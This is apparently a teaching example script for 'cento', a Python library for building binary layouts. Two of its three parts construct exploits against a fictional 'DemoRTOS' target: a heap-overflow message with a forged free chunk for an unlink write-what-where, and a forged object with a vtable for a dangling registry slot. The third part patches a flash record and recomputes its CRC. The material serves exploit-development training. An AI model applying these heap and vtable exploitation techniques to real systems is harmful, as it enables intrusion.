# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
"""cento -- borrowed fragments, arranged deliberately, checked as a whole.

Example 8 -- borrowed structures: bytes the target trusts, views you declare

Three chores that are all the same move: put a typed view over bytes some OTHER code believes in,
and declare every liberty you take. Part 1: a forged heap chunk whose header shares bytes with
the message that carries it -- the overlap IS the exploit, declared with over=/why=, with aliased
where/what fields for the unlink write. Part 2: a forged object and vtable for a dangling
registry slot -- the vptr is Deliver.LATE, the registry write is the ARM trigger. Part 3: no
exploit at all -- patch a dumped flash record without breaking its CRC, waivers carrying the
review reasons, the checksum right by construction.

Run: python3 examples/ex08/ex08_borrowed_structures.py   (transcript.txt is this run, verbatim)
Next: ex09_fake_frame_chain
"""

from __future__ import annotations

import sys

import cento

# The overflow smashes the allocator's walk so the "next chunk header" lands at msg+0x20 -- inside
# bytes we author. Geometry, shared by build_smash() and the final-image reads in part_chunk():
#   0x00 MsgHdr | 0x08 body (pad words) | 0x20 ChunkHdr | 0x30 payload | 0x38 ChunkFoot | 0x40 end
CHUNK_OFF = 0x20
PAYLOAD_OFF = 0x30
FOOT_OFF = 0x38


class MsgHdr(cento.View, size=0x8):
    op: cento.u32
    body_len: cento.u32


class PadWord(cento.View, size=0x4):
    word: cento.u32


class ChunkHdr(cento.View, size=0x10):
    """DemoRTOS pool chunk header. size counts the payload bytes between header and foot."""

    canary: cento.u32
    size: cento.u16
    flags: cento.u16
    bk = cento.Field(0x8, cento.u32, alias="where")  # unlink writes *(bk+0xc): in exploit terms, bk IS the where
    fd = cento.Field(0xC, cento.u32, alias="what")  # ...and fd is the what (mirrored too: *(fd+0x8) = bk)


class ChunkFoot(cento.View, size=0x8):
    """Boundary tag: the size again, then the canary again. Two places to drift by hand."""

    size: cento.u16
    resv: cento.u16
    canary: cento.u32


def build_smash(*, declared: bool) -> cento.Layout:
    """One overflow message. declared=False plants the forgery without owning up to it."""
    op_set_banner = 0x11  # the vulnerable MPKT handler: copies the body into a heap buffer, no bound check
    canary = 0xFEEDC0DE  # allocator design flaw #1: the canary is a STATIC constant -- it forges for free
    flag_free = 0x0001  # size-tag flag: chunk is on the free list (what makes free(neighbor) coalesce into us)

    layout = cento.Layout(endian="big")  # big-endian, like the MK-1
    msg = layout.region("msg", max_size=0x40)

    hdr = msg.at(0x0, MsgHdr, name="hdr")
    hdr.op = op_set_banner
    hdr.body_len = cento.length(msg[0x8:0x40])  # span covers bk/fd, so it resolves only once they do

    body = msg.at(0x8, PadWord * 14, name="body")
    for i in range(6):  # innocuous padding up to the forgery; the tail bytes belong to the chunk views
        body[i].word = 0x50414430 + i  # "PAD0".."PAD5"

    # The forged chunk rides the TAIL of the body placement: same bytes, two owners, on purpose.
    if declared:
        chunk = msg.at(CHUNK_OFF, ChunkHdr, name="fake_chunk", over="body", why="forged header rides the message tail -- the overlap IS the exploit")
        foot = msg.at(FOOT_OFF, ChunkFoot, name="fake_foot", over="body", why="boundary tag of the forged chunk, also message bytes")
    else:
        chunk = msg.at(CHUNK_OFF, ChunkHdr, name="fake_chunk")
        foot = msg.at(FOOT_OFF, ChunkFoot, name="fake_foot")

    chunk.canary = canary  # forgotten canaries are the other classic drift; here it has a name
    chunk.size = cento.length(msg[PAYLOAD_OFF:FOOT_OFF])  # size lives twice; BOTH cells reduce the SAME span,
    foot.size = cento.length(msg[PAYLOAD_OFF:FOOT_OFF])  # so a geometry edit moves them together or not at all
    chunk.flags = flag_free
    # free(neighbor) coalesces into the forged FREE chunk and unlinks it:
    #   *(bk + 0xc) = fd    <- the write-what-where
    #   *(fd + 0x8) = bk    <- the mirror write: fd must ALSO be a writable address
    chunk.where = layout.sym("write_target") - 0xC  # the alias: same cell as chunk.bk; Ref algebra: the -0xc is part of the layout, not of a runbook
    chunk.what = layout.sym("write_value")  # alias of chunk.fd
    foot.resv = 0
    foot.canary = canary
    return layout


def part_chunk() -> bool:
    timer_hook_slot = 0x40200E60  # fiction: DemoRTOS timer-callback table slot -- the WHERE
    staged_payload = 0x40600100  # fiction: payload already parked in the staging page -- the WHAT

    print("step 1: the forgery, undeclared -> CHK-001 names every byte-share")
    naive = build_smash(declared=False)
    print(naive.check().render())
    # Hand-built payloads hide this exact situation in a bytes.join(); here it is an error with
    # subjects and a hint, and the final gate refuses to ship a byte while it stands.
    try:
        naive.emit("image")
    except cento.EmitError as e:
        print(f"refused: {str(e).splitlines()[0]}")

    print("\nstep 2: the same bytes, declared -> the overlap is the design, not a bug")
    layout = build_smash(declared=True)
    print(f"declared with over=/why=: errors = {layout.check().errors}")
    # Ask about one shared byte: it answers with BOTH of its names and the reason they alias.
    print(layout.explain("msg.body[8].word"))

    print("\nstep 3: the write, spelled out -- bk/fd wait for the where/what to exist")
    result = layout.emit("hexdump", final=False)
    print(layout.hexdump())
    for f in result.fixups:  # bk, fd, and the body_len whose span covers them
        print(f"fixup: {f.owner} ({f.region}+0x{f.offset:04x} w{f.width}) awaits {', '.join(f.missing)}")

    print("\nstep 4: bind the what/where, emit the final message")
    layout.bind("write_target", timer_hook_slot, source="fiction: DemoRTOS timer-callback table slot")
    layout.bind("write_value", staged_payload, source="fiction: payload staged at 0x40600100")
    image: bytes = layout.emit("image").artifact["msg"]
    print(f"image ({len(image)} bytes): {image.hex()}")
    head_size = int.from_bytes(image[CHUNK_OFF + 0x4 : CHUNK_OFF + 0x6], "big")
    foot_size = int.from_bytes(image[FOOT_OFF : FOOT_OFF + 0x2], "big")
    print(f"size tag, kept twice: head=0x{head_size:04x} foot=0x{foot_size:04x} -- one span named in two cells cannot drift")
    print(f"free(neighbor) unlinks the forgery: *(bk+0xc) = fd  ->  *(0x{timer_hook_slot:08x}) = 0x{staged_payload:08x}")
    print("the mirror write *(fd+0x8) = bk lands inside the staging page -- fd was chosen writable for exactly that reason")
    return True


REGISTRY_VA = 0x40200000
REGISTRY_SLOT = 0xC  # session table slot 3: dangling since the double-close


class VSlot(cento.View, size=0x4):
    fn: cento.u32


class FakeSession(cento.View, size=0x18):
    """The MpktSession layout the scanner believes in: offsets are the target's, values are ours."""

    vptr: cento.u32  # the word that makes the object look alive
    state: cento.u32
    tag: cento.u32  # checked against a per-boot cookie before dispatch
    peer: cento.u32
    buf_ptr: cento.u32  # the dispatched method drains buf_ptr[0..buf_len)
    buf_len: cento.u32


def build_forgery() -> cento.Layout:
    gadget_entry = 0x40001000  # fictional context-restore epilogue (ex02's CtxRestore): where dispatch lands
    demo_park = 0x40003000  # kernel-side terminal: park the thread, never return
    dispatch_idx = 2  # the scanner's call site: lwz r12, 0x0(obj); lwz r11, 0x8(r12); mtctr r11; bctrl
    sess_established = 2  # the scanner skips sessions whose state word says otherwise
    staging_va = 0x40600000

    layout = cento.Layout(endian="big")  # big-endian, like the MK-1
    layout.bind("staging_va", staging_va, source="fiction: reclaimed chunk, address known from the free")
    layout.bind("registry_va", REGISTRY_VA, source="fiction: DemoRTOS session table")
    staging = layout.region("staging", base="staging_va", max_size=0x60)

    # The fake vtable. The victim class dispatches {reset, poll, dispatch, teardown}; the
    # scanner's tick calls slot 2. Aim exactly that one slot; park the other three -- a
    # stray call through a forged vtable should idle in the kernel, not wander.
    vtbl = staging.at(0x00, VSlot * 4, name="vtbl")
    for i in range(4):
        vtbl[i].fn = gadget_entry if i == dispatch_idx else demo_park

    obj = staging.at(0x10, FakeSession, name="obj")
    obj.state = sess_established
    obj.tag = layout.sym("boot_cookie")  # per-boot; a live leak supplies it mid-delivery
    obj.peer = 0
    obj.buf_ptr = staging.addr(0x40)  # points at the note below, staged alongside the object
    obj.buf_len = 0x8
    staging.pad(0x8, at=0x40, data=b"MPKT0008")  # the note the dispatched method drains

    # The vptr: last of the object's cells to land. If the scanner races our delivery,
    # body-without-vptr is inert garbage; vptr-without-body dispatches on half-written
    # fields. Deliver.LATE picks the survivable failure order.
    obj.vptr = vtbl  # the cell holds &vtbl
    layout.mark(obj.vptr, cento.Deliver.LATE)

    # The trigger lives in a DIFFERENT region: the live registry. One word -- slot 3 of
    # the session table -- re-aimed at the forgery. This is the write that makes the
    # target USE the object, so it is the ARM cell: the DeliveryPlan withholds it until
    # every staged group is confirmed and every symbol is bound.
    registry = layout.region("registry", base="registry_va", max_size=0x20)
    slot = registry.cell(REGISTRY_SLOT)
    slot.write(obj)  # the slot holds &obj
    layout.mark(slot, cento.Deliver.ARM)
    return layout


def part_object() -> bool:
    layout = build_forgery()

    print("the forgery, as cells: three delivery classes, one hole where the tag goes")
    result = layout.emit("hexdump", final=False)
    print(layout.hexdump())
    for f in result.fixups:
        print(f"fixup: {f.owner} ({f.region}+0x{f.offset:04x} w{f.width}) awaits {', '.join(f.missing)}")

    print("explain(): the two cells that must not land early")
    print(layout.explain("staging.obj.vptr"))
    print(layout.explain(REGISTRY_VA + REGISTRY_SLOT))

    plan = layout.plan()
    print("stage(): NORMAL walks right past +0x10 -- the vptr lands [LATE], the trigger not at all")
    groups = plan.stage()
    for group in groups:
        print(group.describe())

    # Gate 1: delivery alone is not enough -- the plan wants confirmation per group.
    try:
        plan.finalize()
    except cento.EmitError as e:
        print(f"refused (unconfirmed): {e}")
    for group in groups:
        plan.confirm(group)

    # Gate 2: the object still has a hole (the per-boot tag); finalize() refuses to arm
    # a forgery the scanner would reject -- or worse, one it would dispatch half-checked.
    try:
        plan.finalize()
    except cento.EmitError as e:
        print(f"refused (unresolved): {e}")

    print("leak lands: bind the cookie, finalize() -- the tag fixup, then ARM last")
    plan.bind("boot_cookie", 0xB007C0DE, source="live leak: scanner tick log")
    for group in plan.finalize():  # ordering guarantee: the ARM group is always yielded last
        print(group.describe())
        plan.confirm(group)
    print("ledger:", " ".join(str(e["ev"]) for e in plan.ledger.events))
    return True


FLAG_WATCHDOG = 0x0001  # shipped default: set by the factory record, preserved by the patch
FLAG_VERBOSE_BOOT = 0x0004  # the flag we want set
BODY_END = 0x3C  # the crc covers [0x00, 0x3C); the tail word is the crc itself


class RecordView(cento.View, size=0x40):
    """The flash record. Bytes 0x20..0x3C are reserved pad (region fill). DemoRTOS records
    are word-oriented: every field the patch touches is a word-aligned u32, so a patch
    through this view REPLACES the raw word cell underneath (same key, new owner)."""

    magic: cento.u32
    version: cento.u32
    boot_flags: cento.u32
    mtu: cento.u32
    name = cento.Field(0x10, cento.Bytes(16))  # one exact-length field, packed as flash stores it
    crc = cento.Field(0x3C, cento.u32)


class Word(cento.View, size=0x4):
    word: cento.u32


def build_original() -> bytes:
    """The record as the factory shipped it. In the field this comes off a flash dump; here
    we construct it deterministically with cento and then treat the bytes as the dump."""
    layout = cento.Layout(endian="big")  # big-endian, like the MK-1
    flash = layout.region("flash_rec", max_size=0x40)
    rec = flash.at(0x0, RecordView, name="rec")
    rec.magic = 0x4D4B4346  # "MKCF": Meridian MK-1 config record
    rec.version = 2
    rec.boot_flags = FLAG_WATCHDOG
    rec.mtu = 1500
    rec.name = b"meridian-mk1".ljust(16, b"\x00")  # Bytes(16): exactly sixteen, or a teaching refusal
    rec.crc = cento.crc32_mpeg2(flash[0x00:BODY_END])  # body span only: including the crc cell itself would be a CHK-007 cycle
    image: bytes = layout.emit("image").artifact["flash_rec"]
    return image


def bootloader_check(image: bytes) -> cento.Report:
    """Replay the bootloader's acceptance test as a cento check: crc32_mpeg2 over the body
    must equal the stored tail word. expect= turns a computed cell into a validator (CHK-005)."""
    layout = cento.Layout(endian="big")  # big-endian, like the MK-1
    rec = layout.region("rec", max_size=0x40)
    rec.pad(0x40, data=image)  # the dumped bytes, one raw word cell each -- image == blob
    stored = int.from_bytes(image[BODY_END:0x40], "big")
    chk = layout.region("bootchk", max_size=0x4)
    chk.cell(0x0).write(cento.crc32_mpeg2(rec[0x00:BODY_END], expect=stored))
    return layout.check()


def hexrows(label: str, data: bytes) -> None:
    print(label)
    for off in range(0, len(data), 16):
        print(f"  +0x{off:02x}  {data[off : off + 16].hex()}")


def part_record() -> bool:
    print("step 1: the record, as dumped from flash")
    orig = build_original()
    hexrows("original record:", orig)
    stored = int.from_bytes(orig[BODY_END:0x40], "big")
    print(f"stored crc: 0x{stored:08x}; bootloader replay: errors = {bootloader_check(orig).errors}")

    print("\nstep 2: the footgun, reproduced -- patch two fields by hand, keep the old crc")
    naive = bytearray(orig)
    naive[0x08:0x0C] = (FLAG_WATCHDOG | FLAG_VERBOSE_BOOT).to_bytes(4, "big")
    naive[0x0C:0x10] = (9000).to_bytes(4, "big")
    print(bootloader_check(bytes(naive)).render())  # CHK-005 names the record the bootloader will reject

    print("\nstep 3: the cento patch -- raw words own the dump, a typed view rewrites three cells")
    layout = cento.Layout(endian="big")  # big-endian, like the MK-1
    flash = layout.region("flash_rec", max_size=0x40)
    raw = flash.at(0x0, Word * 16, name="raw")  # a NAMED word per dumped cell: the CHK-008 rows below cite each one
    for i in range(16):
        raw[i].word = int.from_bytes(orig[4 * i : 4 * i + 4], "big")
    rec = flash.at(0x0, RecordView, name="rec", over="raw", why="typed patch view over the dumped record")
    rec.boot_flags = int.from_bytes(orig[0x08:0x0C], "big") | FLAG_VERBOSE_BOOT  # flip ONE flag, keep the rest as dumped
    rec.mtu = 9000
    rec.crc = cento.crc32_mpeg2(flash[0x00:BODY_END])  # not a number: recomputed over whatever the body ends up saying
    print(layout.check().render())  # CHK-008 x3: the raw words already own those bytes; overrides need a reason
    layout.allow_rewrite(rec.boot_flags, reason="patch: set VERBOSE_BOOT (0x4) for bring-up logging")
    layout.allow_rewrite(rec.mtu, reason="patch: raise mtu 1500 -> 9000 for the capture rig")
    layout.allow_rewrite(rec.crc, reason="recompute the tail crc over the patched body")
    print(layout.check().render(verbose=True))  # the review view: the waivers ship in the report, each with its reason

    print("\nstep 4: emit; the crc is right by construction")
    patched: bytes = layout.emit("image").artifact["flash_rec"]
    hexrows("patched record:", patched)
    changed = [off for off in range(0, 0x40, 4) if orig[off : off + 4] != patched[off : off + 4]]
    print("words changed: " + ", ".join(f"+0x{off:02x}" for off in changed) + "  (we patched two; the crc came free)")
    new_crc = int.from_bytes(patched[BODY_END:0x40], "big")
    print(f"crc: 0x{stored:08x} -> 0x{new_crc:08x}; bootloader replay: errors = {bootloader_check(patched).errors}")
    return True


def main() -> bool:
    print("---- part 1: the forged chunk (the overlap is the exploit) ----")
    if not part_chunk():
        return False
    print("\n---- part 2: the forged object (staging order is the game) ----")
    if not part_object():
        return False
    print("\n---- part 3: the record patch (no exploit, same discipline) ----")
    return part_record()


if __name__ == "__main__":
    if not main():
        sys.exit(1)
